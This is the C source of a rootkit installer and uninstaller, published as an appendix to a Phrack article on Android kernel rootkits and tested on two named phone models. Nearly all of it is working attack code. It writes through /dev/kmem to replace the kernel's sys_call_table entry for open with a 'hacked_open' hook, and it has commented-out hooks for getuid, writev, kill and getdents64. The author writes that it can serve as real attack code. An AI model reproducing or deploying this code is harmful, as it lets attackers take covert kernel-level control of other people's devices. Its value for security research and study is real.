/*
**
** This is appendix of the Phrack (www.phrack.org) article:
** Android platform based linux kernel rootkit
** sys_call_table hooking code installer & uninstaller
**
** All the tests were done on Motoroi XT720 model(2.6.29-omap1 kernel)
** and Galaxy S SHW-M110S model(2.6.32.9 kernel).
** Note that some contents may not apply to all smart platform machines
** and there are some bugs you can modify.
**
** This code can be used as a real code for attack or just a proof-of-
** concept code. I wish you use this code only for your study not for a bad
** purpose.
**
** USE IT AT YOUR OWN RISK!
**
** --
** by "dong-hoon you" (Xpl017Elz), <x82@inetcop.org>
** My World: http://x82.inetcop.org
**
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#define __NR_GETUID 199
#define __NR_WRITEV 146
#define __NR_KILL 37
#define __NR_GETDENTS64 217
#define __NR_OPEN 5

#define MAP_SIZE 4096UL
#define MAP_MASK (MAP_SIZE - 1)

/* read data from kmem */
void read_kmem(unsigned char *m,unsigned off,int sz)
{
	int i;
	void *buf,*v_addr;
	int kmem=open("/dev/kmem",O_RDWR|O_SYNC);
	if(kmem<0){
		return;
	}
	if((buf=mmap(0,MAP_SIZE*2,PROT_READ|PROT_WRITE,MAP_SHARED,kmem,off&~MAP_MASK))==(void *)-1){
		perror("read: mmap error");
		exit(0);
	}
	for(i=0;i<sz;i++){
		v_addr=buf+(off&MAP_MASK)+i;
		m[i]=*((unsigned char *)v_addr);
	}
	if(munmap(buf,MAP_SIZE*2)==-1){
		perror("read: munmap error");
		exit(0);
	}
	close(kmem);
}

/* write data to kmem */
void write_kmem(unsigned char *m,unsigned off,int sz)
{
	int i;
	void *buf,*v_addr;
	int kmem=open("/dev/kmem",O_RDWR|O_SYNC);
	if(kmem<0){
		return;
	}
	
	if((buf=mmap(0,MAP_SIZE*2,PROT_READ|PROT_WRITE,MAP_SHARED,kmem,off&~MAP_MASK))==(void *)-1){
		perror("write: mmap error");
		exit(0);
	}
	for(i=0;i<sz;i++){
		v_addr=buf+(off&MAP_MASK)+i;
		*((unsigned char *)v_addr)=m[i];
	}
	if(munmap(buf,MAP_SIZE*2)==-1){
		perror("write: munmap error");
		exit(0);
	}
	close(kmem);
}

/* write int to kmem */
void write_kmem2(unsigned long m,unsigned long off)
{
	void *buf,*v_addr;
	int kmem=open("/dev/kmem",O_RDWR|O_SYNC);
	if(kmem<0){
		return;
	}
	if((buf=mmap(0,MAP_SIZE*2,PROT_READ|PROT_WRITE,MAP_SHARED,kmem,off&~MAP_MASK))==(void *)-1){
		perror("write: mmap error");
		exit(0);
	}
	v_addr=buf+(off&MAP_MASK);
	*((unsigned long *)v_addr)=m;
	if(munmap(buf,MAP_SIZE*2)==-1){
		perror("write: munmap error");
		exit(0);
	}
	close(kmem);
}

#if 0
/* user mode get_sys_call_table function */
int get_sys_call_table(){
	void *swi_addr=(long *)0xffff0008;
	unsigned long offset=0;
	unsigned long *vector_swi_addr=0,*ptr;
	unsigned long sys_call_table=0;
	unsigned char buf[MAP_SIZE+1];

	offset=((*(long *)swi_addr)&0xfff)+8;
	vector_swi_addr=*(unsigned long *)(swi_addr+offset);

	memset((char *)buf,0,sizeof(buf));
	read_kmem(buf,(long)vector_swi_addr,MAP_SIZE);
	ptr=buf;

	while(ptr){
		if(((*(unsigned long *)ptr)&0xfffff000)==0xe28f8000){
			offset=((*(unsigned long *)ptr)&0xfff)+8;
			sys_call_table=(void *)vector_swi_addr+offset;
			break;
		}
		ptr++;
		vector_swi_addr++;
	}
	return sys_call_table;
}
#endif

unsigned long get_kernel_symbol(char *sym_name){
	FILE *fp;
	unsigned char buf[256];
	unsigned char symbol_name[256];
	unsigned long addr=0;

	memset(symbol_name,0,sizeof(symbol_name));
	snprintf(symbol_name,sizeof(symbol_name)-1," %s",sym_name);

	if((fp=fopen("/proc/kallsyms","r"))==NULL){
		exit(-1);
	}
	
	while(fgets(buf,sizeof(buf)-1,fp)){
		if(strstr(buf,symbol_name)){
			sscanf(buf,"%x ",&addr);
			break;
		}
	}
	fclose(fp);
	printf("get_kernel_symbol: %s: 0x%08x\n", sym_name, addr);
	return addr;
}

void modify_sys_call_table(int c){
	unsigned char buf[MAP_SIZE+1];
	char *addr_ptr;
	unsigned long addr; /* sys_call_table */

	addr=get_kernel_symbol("sys_call_table");
	printf("sys_call_table: %p\n",addr);
	printf("modify_sys_call_table\n");
	if(c=='I'||c=='i'){ /* install */
		printf("modify_sys_call_table i\n");

		addr_ptr=(char *)get_kernel_symbol("hacked_open");
		write_kmem((char *)&addr_ptr,addr+__NR_OPEN*4,4);
		
//		addr_ptr=(char *)get_kernel_symbol("hacked_getuid");
//		write_kmem((char *)&addr_ptr,addr+__NR_GETUID*4,4);
//		addr_ptr=(char *)get_kernel_symbol("hacked_writev");
//		write_kmem((char *)&addr_ptr,addr+__NR_WRITEV*4,4);
//		addr_ptr=(char *)get_kernel_symbol("hacked_kill");
//		write_kmem((char *)&addr_ptr,addr+__NR_KILL*4,4);
//		addr_ptr=(char *)get_kernel_symbol("hacked_getdents64");
//		write_kmem((char *)&addr_ptr,addr+__NR_GETDENTS64*4,4);
	} else if(c=='U'||c=='u'){ /* uninstall */
		printf("modify_sys_call_table u\n");
		addr_ptr=(char *)get_kernel_symbol("sys_open");
		write_kmem((char *)&addr_ptr,addr+__NR_OPEN*4,4);

//		addr_ptr=(char *)get_kernel_symbol("sys_getuid");
//		write_kmem((char *)&addr_ptr,addr+__NR_GETUID*4,4);
//		addr_ptr=(char *)get_kernel_symbol("sys_writev");
//		write_kmem((char *)&addr_ptr,addr+__NR_WRITEV*4,4);
//		addr_ptr=(char *)get_kernel_symbol("sys_kill");
//		write_kmem((char *)&addr_ptr,addr+__NR_KILL*4,4);
//		addr_ptr=(char *)get_kernel_symbol("sys_getdents64");
//		write_kmem((char *)&addr_ptr,addr+__NR_GETDENTS64*4,4);
//	} else if (c=='D'||c=='d'){/* dump table */
//		printf("modify_sys_call_table d\n");
//		unsigned char buf[5];
//		memset(buf, 0, 5);
//		printf("sys_getuid: %08x, hacked_getuid: %08x\n", (char *)get_kernel_symbol("sys_getuid"), (char *)get_kernel_symbol("hacked_getuid"));
//		read_kmem(buf,(long)0xc00a9274,4);
//		printf("buf: %08x\n", buf);
		

	}


}

int main(int argc,char *argv[])
{
	nice(-20); // setting priority
	if(argc<2){
		printf("%s [I or U]\n",argv[0]);
		exit(0);
	}
	modify_sys_call_table(argv[1][0]);
}

